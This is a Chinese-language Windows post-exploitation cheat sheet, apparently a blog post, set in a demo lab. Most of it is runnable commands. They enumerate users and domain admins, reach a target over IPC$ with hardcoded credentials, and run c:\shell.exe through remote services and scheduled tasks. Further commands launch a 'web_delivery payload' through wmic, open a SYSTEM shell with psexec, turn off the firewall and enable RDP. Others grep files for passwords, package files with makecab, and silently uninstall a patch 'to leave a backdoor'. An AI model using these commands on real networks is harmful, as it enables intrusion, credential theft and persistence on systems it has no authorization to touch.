# win信息收集（V2）

0x01 基础命令使用:

演示环境:

```text
win2008R2cn     ip: 192.168.3.23    假设为入侵者机器
win2012R2cn     ip: 192.168.3.122   假设为目标机器
```

```text
# whoami /all             查当前用户在目标系统中的具体权限,这可能会成为你一上来的习惯性动作 ^_^
# query user              查当前机器中正在线的用户,注意管理员此时在不在
# hostname            查当前机器的机器名,知道当前机器是干啥的
# net user            查当前机器中所有的用户名,开始搜集准备用户名字典
# net localgroup          查当前机器中所有的组名,了解不同组的职能,如,IT,HR,ADMIN,FILE...
# net localgroup "Administrators" 查指定组中的成员列表
```

查看本机ip配置:

```text
# ipconfig /all     查看本机ip配置,观察本机是否在域内,内网段有几个,网关在哪里
# ipconfig /displaydns  查看本地DNS缓存
```

查看当前机器中所有的网络连接:

```text
# net start             查看本机运行的所有服务
# netstat -ano              查看本机所有的tcp,udp端口连接及其对应的pid
# netstat -anob             查看本机所有的tcp,udp端口连接,pid及其对应的发起程序
# netstat -ano | findstr "ESTABLISHED"  查看当前正处于连接状态的端口及ip
# netstat -ano | findstr "LISTENING"    查看当前正处于监听状态的端口及ip
# netstat -ano | findstr "TIME_WAIT"    
```

&lt;!-- more --&gt; 利用最基础的ipc连接,这里需要注意下防火墙,如果没允许`文件和打印共享`服务,是根本net不上去的

```text
# net use \\192.168.3.122\ipc$ /u:"" ""     先空连接探测
# net use                   查看当前机器中的ipc连接有哪些
# net use \\192.168.3.122\ipc$ /del
# net use \\192.168.3.122\admin$ /user:"dcadmin" "admin!@#45"   建立真正的ipc
```

ipc建立成功后,尝试直接在本地往远程机器上拷贝文件

```text
第一种方式:
# net use p: \\192.168.3.122\c$     可在建立ipc后直接把对方的c盘映射过来,直接在本地进行拷贝
# net use p: /del           用完以后,务必立马删除映射
```

```text
第二种方式[推荐用xcopy]:
# xcopy d:\sqlitedata\*.* \\192.168.3.122\c$\temp /E /Y /D  也可在建立ipc后直接远程拷贝
```

依然是在ipc建立后,可直接在远程机器上创建,删除服务,创建服务时需要注意,常规程序需要有返回值,不然启动服务时会报1053错误

```text
# sc \\192.168.3.122 create shellsrv binpath= "c:\shell.exe" start= auto displayname= "shellstart"
# sc \\192.168.3.122 stop shllsrv
# sc \\192.168.3.122 delete shellsrv
```

```text
# net use \\192.168.3.122\admin$ /del
# net use * /del    最后,删除所有ipc,如果系统中还有其它的ipc连接,也可指定只删除自己的
```

在远程机器上快速创建删除定时任务,需要指定目标系统的账号密码 \[ 03以下系统用at,想必大家都已非常熟练,这里不再多说 \]

```text
# net use \\192.168.3.122\admin$ "admin!@#45" /user:"klionsec\administrator"
# net time \\192.168.3.122  查看目标机器当前时间
# net use \\192.168.3.122\admin$ /del
​
# schtasks /create  /?      查看schtasks使用帮助
# chcp 437          如果当前机器是中文系统需要先修改下cmd字符集,默认cmd是gbk,不然后面用schtasks远程创建计划任务时会报错
# chcp 936          用完以后再把字符集改回来,如果是英文系统就不会有这种问题
# schtasks /s 192.168.3.122 /u "klionsec\administrator" /p "admin!@#45" /create /TN "shellexec" /SC DAILY /ST 11:18 /F /RL HIGHEST /SD 2017/11/13 /ED 2017/11/16 /TR "C:\shell.exe"
# schtasks /s 192.168.3.122 /u "klionsec\administrator" /p "admin!@#45" /query  | findstr "shell"
# schtasks /s 192.168.3.122 /u "klionsec\administrator" /p "admin!@#45" /TN "shellexec" /delete
```

初步先大致看下当前所在内网有多少存活机器 \[ 单基于icmp的扫描 \]:

```text
# for /L %I in (1,1,254) DO @ping -n 1 192.168.3.%I | findstr "TTL=128" >> pinglog.txt
```

搜集当前内网中的dns信息:

```text
# for /L %I in (1,1,254) DO @nslookup 192.168.3.%I | find "Name:" >> dnslog.txt
```

操作当前机器防火墙\[务必先提权\]:

```text
# netsh advfirewall show private        查看当前机器防火墙状态
# netsh advfirewall set allprofiles state off   关闭当前机器防火墙
# netsh advfirewall set allprofiles state on    开启当前机器防火墙
```

操作当前机器的rdp,实战中推荐直接用powershell来搞,直接用reg可能会触发防护报警:

第一种,使用原始的reg工具,适合03以下的系统

```text
查询rdp的端口,注意把默认的十六进制转换成十进制
# reg query "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
​
启用rdp:
# reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
​
禁用rdp:
# reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```

第二种,利用powershell

```text
利用powershell启用禁用rdp:
C:\>powershell -exec bypass
PS C:\> Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
PS C:\> Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 1
​
放开防火墙对rdp的限制
# netsh advfirewall firewall set rule group="remote desktop" new enable=yes
# netsh advfirewall firewall set rule group="远程桌面" new enable=yes
```

查看本机的路由情况:

```text
# route print           打印本机路由信息,可以看到本机所有的网卡接口
# arp -a            查找有价值的内网arp 通信记录
# netsh int ip delete arpcache  删除当前机器的arp缓存
# tracert 8.8.8.8       跟踪本机出口ip
```

查看当前机器自身的配置信息:

```text
# systeminfo            查看本机的详细配置信息
# systeminfo /S 192.168.3.122 /U KLIONSEC\administrator /P "admin!@#123"    查看远程指定机器的详细系统配置信息
# systeminfo>temp.txt&(for %i in (KB2271195 KB2124261 KB2160329 KB2621440  KB2707511 KB2829361 KB2864063 KB3000061 KB3045171 KB3036220 KB3077657 KB3079904 KB3134228 KB3124280 KB3199135) do @type temp.txt|@find /i  "%i"|| @echo %i Not Installed!)&del /f /q /a temp.txt
​
# set               查看当前机器的环境变量配置,看有没有我们可以直接利用到的语言环境
# ver / winver          查看当前机器的NT内核版本
# fsutil fsinfo drives      列出当前机器上的所有盘符
# net share         查看当前机器开启的共享
# net share public_dir="c:\public" /grant:Everyone,Full  设置共享
```

在指定目录下搜集各类敏感文件:

```text
# dir /a /s /b d:\"*.txt"
# dir /a /s /b d:\"*.xml"
# dir /a /s /b d:\"*.mdb"
# dir /a /s /b d:\"*.sql"
# dir /a /s /b d:\"*.mdf"
# dir /a /s /b d:\"*.eml"
# dir /a /s /b d:\"*.pst"
# dir /a /s /b d:\"*conf*"
# dir /a /s /b d:\"*bak*"
# dir /a /s /b d:\"*pwd*"
# dir /a /s /b d:\"*pass*"
# dir /a /s /b d:\"*login*"
# dir /a /s /b d:\"*user*"
```

批量压缩指定文件,注意,list.txt里存放的是所有要打包文件的绝对路径:

```text
# makecab /f list.txt /d compressiontype=lzx /d compressionmemory=21 /d maxdisksize=1024000000 /d diskdirectorytemplate=dd* /d cabinetnametemplate=dd*.cab
```

在指定目录下搜集各种账号密码

```text
# findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak 
# findstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak 
# findstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak 
# findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak 
# findstr /si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak 
```

查看,删除 指定文件:

```text
# type ad\admin_pass.bak        查看某个文件内容
# del d:\ad\*.* /a /s /q /f         强制删除指定路径下的所有文件
# tree /F /A D:\ >> file_list.txt   导出指定路径下的文件目录结构
```

查看当前机器的进程信息:

```text
# tasklist /svc     显示当前机器所有的进程所对应的服务[只限于当前用户又权限看到的进程]
# tasklist /m       显示本地所有进程所调用的dll[同样只限于当前用户又权限看到的进程]
# tasklist /S 192.168.3.122 /v /U administrator /P "admin!@#123"         查看远程指定机器的进程列表
# tasklist /S 192.168.3.122 /v /U KLIONSEC\administrator /P "admin!@#123"    域内可以直接用机器名来代替
​
# taskkill /im calc.exe 用指定进程名的方式结束指定进程
# taskkill /S 192.168.3.122 /pid 3440 /U KLIONSEC\administrator /P "admin!@#123" 结束远程机器上的指定进程
​
# wusa /uninstall /KB:2999226 /quiet /norestart     不重启卸载指定系统补丁,方便留后门,前提是权限要够
# driverquery       查看当前机器安装的驱动列表
# restart /r /t 0   立即重启当前机器
```

0x03 域内net及dsquery套件使用

利用常规net套件搜集域内信息

```text
# net user /domain      查看当前域中的所有用户名,根据用户名总数大概判断域的规模
# net user epoadmin /domain     查看指定用户在当前域中的详细属性信息
# net view          正常情况下可以用该命令查看当前域中在线的机器有哪些,但这样看着确实不太直观,稍微用批处理搞一下把机器名对应的ip也显示出来,岂不更畅快
# net accounts /domain      查看当前域的域内账户密码设置策略
# net config workstation        看看当前的登录域
# net view /domain          查看所有的域名称
# net view /domain:PROGRAM  查看指定域中在线的计算机列表
# net time /domain      查看主域位置,一般都会把主域作为时间服务器
# net group /domain     查看当前域中的所有组名
# net group "domain admins" /domain      看看当前域中的域管都有谁
# net group "domain computers" /domain   看看当前域中的所有的计算机名,只要登录过该域计算机名都会被保存下来,并非当前在线机器
# net group "domain controllers" /domain 看看域控是哪几个
# nltest /domain_trusts          查看域内信任关系
```

批量把net view的结果转换为ip

```text
@echo off
setlocal ENABLEDELAYEDEXPANSION
@FOR /F "usebackq eol=- skip=1 delims=\" %%j IN (`net view ^| find "命令成功完成" /v ^|find "The command completed successfully." /v`) DO (
@FOR /F "usebackq delims=" %%i IN (`@ping -n 1 -4 %%j ^| findstr "Pinging"`) DO (
@FOR /F "usebackq tokens=2 delims=[]" %%k IN (`echo %%i`) DO (echo %%k  %%j)
)
)
```

利用dsquery 工具搜集域内信息,该工具貌似只在域控机器上有,应该是在域的安装包里,你可以把对应系统的这个工具的exe和dll扣出来上传上去用

```text
# dsquery computer  查看当前域内的所有机器,dsquery工具一般在域控上才有,不过你可以上传一个和目标系统版本对应的dsquery
# dsquery user      查看当前域中的所有账户名
# dsquery group     查看当前域内的所有组名
# dsquery subnet    查看到当前域所在的网段
# dsquery site      查看域内所有的web站点
# dsquery server    查看当前域中的所有服务器(应该是指域控)
# dsquery user domainroot -name admin* -limit 240  查询前240个以admin开头的用户名
```

0x04 wmic套件使用\[其实,上面基础工具能干的事情,wmic全部能干,且过之不及\],在操作远程时,如果遇到'RPC 服务不可用'直接把机器名换成ip即可,别看这么多,我们实战用的最多的可能就是远程执行及远程开启rdp了,如,远程导hash,远程执行payload...

查询当前及远程机器的进程信息

```text
# wmic process list brief
# wmic process list brief /every:1  每隔一秒刷新一次系统进程
# wmic /node:"192.168.3.122" /user:klionsec\administrator /password:"admin!@#123" process list brief
```

查询当前及远程机器上指定进程的详细信息

```text
# wmic process where name='calc.exe'  list brief
# wmic /node:"192.168.3.122" /user:klionsec\administrator /password:"admin!@#123" process where name='calc.exe'  list brief
```

删除当前及远程机器中的指定进程

```text
# wmic process where name='calc.exe' delete
# wmic /node:"192.168.3.122" /user:klionsec\administrator /password:"admin!@#123" process where name='calc.exe' delete
```

在当前机器中执行指定程序

```text
# wmic process call create "calc.exe"
```

通过smb在远程机器上执行指定程序,如,在本地让远程机器上线,在抓取目标系统用户的hash,等等...

```text
# wmic /node:192.168.3.122 /user:klionsec\administrator /password:"admin!@#123" process call create "web_delivery payload"
```

终止执行某程序

```text
# wmic process where name="calc.exe" call terminate
# wmic /node:192.168.3.122 /user:klionsec\administrator /password:"admin!@#123" process where name="calc.exe" call terminate
```

开启,关闭当前机器的rdp

```text
# wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1	开启
# wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0	关闭
```

开启,关闭远程机器的rdp

```text
# wmic /node:"192.168.3.122" /USER:"klionsec\administrator" /password:"admin!@#123" PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1 
# wmic /node:"192.168.3.122" /USER:"klionsec\administrator" /password:"admin!@#123" PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 0 
```

查询当前机器已安装的补丁

```text
# wmic qfe get description,installedOn,HotFixID,InstalledBy
# wmic qfe get CSName,Description,hotfixid
```

查询当前机器自启动程序有哪些

```text
# wmic startup list full
# wmic STARTUP GET Caption,Command,User
```

查询当前机器所安装的所有软件名

```text
# wmic product get name /value
# wmic product get name,version
```

删除当前机器中指定名称的软件

```text
# wmic product where name="Google Update Helper" call uninstall /nointeractive
```

查询本机所有的盘符及剩余空间

```text
# wmic logicaldisk get description,name
# wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber
```

查询当前机器的简要配置信息

```text
# wmic computersystem list brief /format:list
```

查询当前机器的操作系统位数

```text
# wmic cpu get DataWidth /format:list
```

查询当前机器的用户及组信息

```text
# wmic useraccount list brief /format:list
# wmic group list brief /format:list  
```

查询当前机器所有用户的详细信息

```text
# wmic useraccount list brief
```

查询当前机器所有服务的详细状态

```text
# wmic service list brief
```

查询指定域的域管有哪些

```text
# wmic /node:rootkit path win32_groupuser where (groupcomponent="win32_group.name=\"adm\",domain=\"rootkit\"")
```

查看谁登陆过指定机器,适合用来找域管进程

```text
# wmic /node:192.168.3.23 path win32_loggedonuser get antecedent
```

查询本机共享

```text
# wmic share  get name,path,status
```

0x05 使用pstools套件

```text
# psexec /accepteula \\192.168.3.122 -u klionsec\administrator -p "admin!@#123" -s -c -f "cmd.exe"	弹回一个system权限的cmdshell
# psexec /accepteula \\192.168.3.23 -u klionsec\administrator -p lm:ntlm -s -c -f "cmd.exe"		适合03以下的系统 
```

 小结: 这里只简单罗列一些实战经常可能会用到的基础命令,有些命令可能需要在管理权限\[system或root\]下才能运行,还有很多其它的系统命令工具没法一下子跟大家说完,后续咱们再慢慢来,有些命令在之前文章都附带的用过,比较简单,就各种命令工具本身来讲没有任何技术含量,甚至一些工具完全可以自己实现`有时真的没必要重复造轮子,在你没有别人写的好的情况下`,大家可能也发现了,很多实际渗透中的需求,系统自身早就为我们提供好了对应的工具,只是一直没去发掘而已,大可不必拿第三方工具来搞`尤其在有powershell的情况下`,这样也确实省去了不少的麻烦,比如,免杀,防护限制\[上传,执行\],等等...,总之,说了这么多,最终目的还是希望大家能利用这些东西真正帮自己做事情,利用目标已有工具,挖掘出更多高价值信息也是我们最想看到的,只简单的会用个命令,基本是没啥实际用的,能从命令结果探测到更多有价值的信息才是目的,比如,你知道netstat 是用来查目标系统网络连接的,但只知道这又有什么用呢,我们看连接的目的,主要还是想知道,当前系统中都跑了什么高危服务,有没有我们后期可以利用到的,哪些是跟目标内网机器的连接,看看有没有别人的tcp马,找找是那个程序发起的...等等,这里只是举个简单的例子,关于`linux篇`,我们待续...

